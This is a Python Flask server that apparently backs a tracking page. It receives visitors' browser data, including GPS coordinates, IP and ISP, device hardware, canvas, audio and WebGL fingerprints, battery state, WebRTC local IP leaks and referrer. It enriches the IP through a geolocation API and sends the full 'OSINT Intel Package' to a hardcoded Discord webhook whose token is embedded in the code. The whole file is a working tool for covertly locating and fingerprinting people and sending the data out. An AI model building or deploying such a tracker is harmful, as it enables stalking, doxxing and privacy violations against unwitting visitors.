from flask import Flask, request, jsonify, send_file
import json
import datetime
import os
import requests
import re
import time
from pathlib import Path
import ipaddress

app = Flask(__name__)

# --- YOUR NEW DISCORD WEBHOOK URL ---
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536189236431290369/lAIwbt_ESg5gor_CXxkx7WbR8Sjol7lMtg_EeWVYBJaiK8c_8znAEXMPGUxQxrwF5deB"

def send_to_discord(data):
    """Send collected data to Discord webhook with retry logic"""
    
    print(f"\n{'='*60}")
    print(f"SENDING TO DISCORD: {datetime.datetime.now()}")
    print(f"{'='*60}")
    
    # Simple test message first
    test_payload = {
        "content": "🔔 **Webhook Test** - Your tracker is active!",
        "username": "OSINT Tracker"
    }
    
    try:
        # First, send a test message to verify the webhook works
        test_response = requests.post(DISCORD_WEBHOOK, json=test_payload, timeout=10)
        print(f"Test message status: {test_response.status_code}")
        
        if test_response.status_code != 204:
            print(f"⚠️ Webhook test failed: {test_response.status_code} - {test_response.text}")
            # Continue anyway, maybe the webhook still works for embeds
        else:
            print("✅ Webhook test message sent!")
            
    except Exception as e:
        print(f"⚠️ Error sending test message: {e}")
        # Continue with the main payload anyway
    
    # --- Build the main embed ---
    embed = {
        "title": "🎯 OSINT Intel Package",
        "color": 0x5865F2,
        "fields": [],
        "footer": {"text": f"Session: {data.get('sessionId', 'unknown')} | {datetime.datetime.utcnow().isoformat()}"},
        "timestamp": datetime.datetime.utcnow().isoformat()
    }
    
    # 1. LOCATION (Primary focus)
    location = data.get('location', {})
    if location and isinstance(location, dict):
        lat = location.get('latitude')
        lng = location.get('longitude')
        accuracy = location.get('accuracy', 'N/A')
        
        if lat and lat != 'N/A' and lng and lng != 'N/A':
            maps_link = f"https://maps.google.com/?q={lat},{lng}"
            street_view = f"https://maps.google.com/maps?q={lat},{lng}&z=19&t=k&layer=c"
            
            embed["fields"].append({
                "name": "📍 GPS Location",
                "value": f"**Coordinates:** {lat}, {lng}\n**Accuracy:** ±{accuracy}m\n[Google Maps]({maps_link}) | [Street View]({street_view})",
                "inline": False
            })
        else:
            error_msg = location.get('error', 'Location not shared')
            embed["fields"].append({
                "name": "📍 Location",
                "value": f"❌ Location not shared\nReason: {error_msg}",
                "inline": False
            })
    
    # 2. IP Intelligence
    ip_intel = data.get('ipIntel', {})
    if ip_intel:
        ip_fields = []
        if ip_intel.get('ip'): ip_fields.append(f"**IP:** `{ip_intel.get('ip')}`")
        if ip_intel.get('isp'): ip_fields.append(f"**ISP:** {ip_intel.get('isp')}")
        if ip_intel.get('asn'): ip_fields.append(f"**ASN:** {ip_intel.get('asn')}")
        if ip_intel.get('city'): ip_fields.append(f"**City:** {ip_intel.get('city')}")
        if ip_intel.get('region'): ip_fields.append(f"**Region:** {ip_intel.get('region')}")
        if ip_intel.get('country'): ip_fields.append(f"**Country:** {ip_intel.get('country')}")
        
        # Threat detection
        threats = []
        if ip_intel.get('vpn'): threats.append("🔒 VPN")
        if ip_intel.get('proxy'): threats.append("🚫 Proxy")
        if ip_intel.get('hosting'): threats.append("☁️ Hosting")
        if ip_intel.get('mobile'): threats.append("📱 Mobile")
        if threats:
            ip_fields.append(f"**Threats:** {', '.join(threats)}")
        
        if ip_fields:
            embed["fields"].append({
                "name": "🌐 IP Intelligence",
                "value": "\n".join(ip_fields),
                "inline": False
            })
    
    # 3. Device Hardware
    hardware = data.get('hardware', {})
    if hardware:
        device_fields = []
        if hardware.get('platform'): device_fields.append(f"**Platform:** {hardware.get('platform')}")
        if hardware.get('hardwareConcurrency'): device_fields.append(f"**CPU Cores:** {hardware.get('hardwareConcurrency')}")
        if hardware.get('deviceMemory'): device_fields.append(f"**RAM:** {hardware.get('deviceMemory')}GB")
        if hardware.get('maxTouchPoints'): device_fields.append(f"**Touch Points:** {hardware.get('maxTouchPoints')}")
        
        # Screen
        screen = data.get('screen', {})
        if screen:
            screen_res = f"{screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}"
            if screen.get('pixelRatio'):
                screen_res += f" @{screen.get('pixelRatio')}x"
            device_fields.append(f"**Screen:** {screen_res}")
        
        if device_fields:
            embed["fields"].append({
                "name": "💻 Device",
                "value": "\n".join(device_fields),
                "inline": False
            })
    
    # 4. Fingerprints
    fingerprint_fields = []
    if data.get('canvasFingerprint'):
        fingerprint_fields.append(f"**Canvas:** `{data.get('canvasFingerprint')}`")
    if data.get('audioFingerprint'):
        fingerprint_fields.append(f"**Audio:** `{data.get('audioFingerprint')}`")
    if data.get('webgl'):
        webgl = data.get('webgl', {})
        if webgl.get('vendor'):
            fingerprint_fields.append(f"**GPU:** {webgl.get('vendor')}")
        if webgl.get('renderer'):
            fingerprint_fields.append(f"**Renderer:** {webgl.get('renderer')}")
    
    if fingerprint_fields:
        embed["fields"].append({
            "name": "🆔 Fingerprints",
            "value": "\n".join(fingerprint_fields),
            "inline": False
        })
    
    # 5. Battery
    battery = data.get('battery', {})
    if battery:
        battery_fields = []
        if battery.get('level'): battery_fields.append(f"**Level:** {battery['level']}")
        if battery.get('charging') is not None: battery_fields.append(f"**Charging:** {battery['charging']}")
        if battery_fields:
            embed["fields"].append({
                "name": "🔋 Battery",
                "value": "\n".join(battery_fields),
                "inline": False
            })
    
    # 6. WebRTC Leak
    webrtc = data.get('webRTCIPs', [])
    if webrtc and webrtc[0] != 'No local IPs found' and webrtc[0] != 'WebRTC not supported':
        embed["fields"].append({
            "name": "🔓 WebRTC IP Leak",
            "value": f"```{', '.join(webrtc)}```",
            "inline": False
        })
    
    # 7. Behavioral
    behavioral = []
    if data.get('referrer'): behavioral.append(f"**Referrer:** {data['referrer']}")
    if data.get('url'): behavioral.append(f"**URL:** {data['url']}")
    if data.get('language'): behavioral.append(f"**Language:** {data['language']}")
    if data.get('timezone'): behavioral.append(f"**Timezone:** {data['timezone']}")
    if data.get('historyDepth') is not None: behavioral.append(f"**History Depth:** {data['historyDepth']}")
    
    if behavioral:
        embed["fields"].append({
            "name": "🧠 Behavioral",
            "value": "\n".join(behavioral),
            "inline": False
        })
    
    # 8. Network
    network = data.get('network', {})
    if network:
        net_fields = []
        if network.get('type'): net_fields.append(f"**Type:** {network['type']}")
        if network.get('downlink'): net_fields.append(f"**Downlink:** {network['downlink']} Mbps")
        if network.get('rtt'): net_fields.append(f"**RTT:** {network['rtt']}ms")
        if net_fields:
            embed["fields"].append({
                "name": "📶 Network",
                "value": "\n".join(net_fields),
                "inline": False
            })
    
    # Fallback: If no fields, add a generic one
    if not embed["fields"]:
        embed["fields"].append({
            "name": "📊 Data Received",
            "value": f"Session: {data.get('sessionId', 'unknown')}\nTimestamp: {data.get('timestamp', 'unknown')}",
            "inline": False
        })
    
    # --- Send the payload with retry ---
    payload = {
        "content": "📊 **New OSINT Package Collected!**",
        "embeds": [embed],
        "username": "OSINT Tracker"
    }
    
    # Try up to 3 times
    for attempt in range(3):
        try:
            print(f"📤 Sending Discord payload (attempt {attempt+1}/3)...")
            response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=15)
            print(f"📥 Discord response: {response.status_code}")
            
            if response.status_code == 204:
                print("✅ Data sent successfully to Discord!")
                return True
            elif response.status_code == 429:
                # Rate limited - wait and retry
                retry_after = int(response.headers.get('Retry-After', 5))
                print(f"⏳ Rate limited, waiting {retry_after} seconds...")
                time.sleep(retry_after)
            else:
                print(f"❌ Discord error: {response.status_code} - {response.text}")
                # Wait before retry
                time.sleep(2)
                
        except Exception as e:
            print(f"❌ Discord send error: {e}")
            time.sleep(2)
    
    print("❌ All attempts to send to Discord failed")
    return False

# Serve the main page
@app.route('/')
def serve_index():
    return send_file('../static/index.html')

# Receive tracking data
@app.route('/track', methods=['POST'])
def track_data():
    data = request.json
    
    # Get IP intelligence from request headers
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    # Try to get IP info (you can add your own API key here)
    ip_intel = {}
    try:
        response = requests.get(f'http://ip-api.com/json/{client_ip}', timeout=5)
        if response.status_code == 200:
            ip_data = response.json()
            if ip_data.get('status') == 'success':
                ip_intel = {
                    'ip': ip_data.get('query'),
                    'country': ip_data.get('country'),
                    'city': ip_data.get('city'),
                    'region': ip_data.get('regionName'),
                    'isp': ip_data.get('isp'),
                    'asn': ip_data.get('as'),
                    'org': ip_data.get('org'),
                    'timezone': ip_data.get('timezone'),
                    'lat': ip_data.get('lat'),
                    'lon': ip_data.get('lon')
                }
    except Exception as e:
        print(f"IP lookup failed: {e}")
    
    data['ipIntel'] = ip_intel
    
    # Log to console
    print(f"\n{'='*60}")
    print(f"OSINT DATA RECEIVED - {datetime.datetime.now()}")
    print(f"{'='*60}")
    print(json.dumps(data, indent=2))
    print(f"{'='*60}\n")
    
    # Send to Discord
    discord_sent = send_to_discord(data)
    
    return jsonify({
        "status": "success",
        "discord_sent": discord_sent
    })

# Health check
@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

app = app
